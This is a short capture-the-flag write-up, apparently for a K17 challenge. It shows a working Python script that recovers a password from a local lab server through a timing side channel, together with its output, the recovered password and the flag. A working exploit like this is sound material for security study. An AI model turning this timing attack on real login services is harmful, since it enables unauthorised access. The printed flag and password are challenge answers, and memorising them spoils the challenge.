By testing different inputs, we noticed that the server adds ~100 ms for each correct character.
We can recover the password one character at a time by picking the character with the longest response time. 
The delay stops after 10 characters, so the password is 10 characters long.

```python
import string
import requests
import re

url = "http://127.0.0.1:1337/"

password = ""
for i in range(20):
    best_char = ""
    best_time = -1
    for c in string.ascii_letters + string.digits:
        guess = password + c
        r = requests.get(url, params={"password": guess})
        match = re.search(r"Response time: ([\d.]+) ms", r.text)
        time_ms = float(match.group(1))
        if time_ms > best_time:
            best_time = time_ms
            best_char = c
    password += best_char
    print(f"password: {password}, time: {best_time}")

# password: H, time: 100.92
# password: H8, time: 202.36
# password: H8i, time: 302.03
# password: H8iO, time: 402.79
# password: H8iOb, time: 504.32
# password: H8iObj, time: 604.61
# password: H8iObjI, time: 705.44
# password: H8iObjIc, time: 804.93
# password: H8iObjIcS, time: 905.67
# password: H8iObjIcSr, time: 1008.11
# password: H8iObjIcSrj, time: 1011.4
# password: H8iObjIcSrjL, time: 1009.95
# correct password -> H8iObjIcSr
```

Flag: `K17{aLL_iN_go0d_t1m3}`
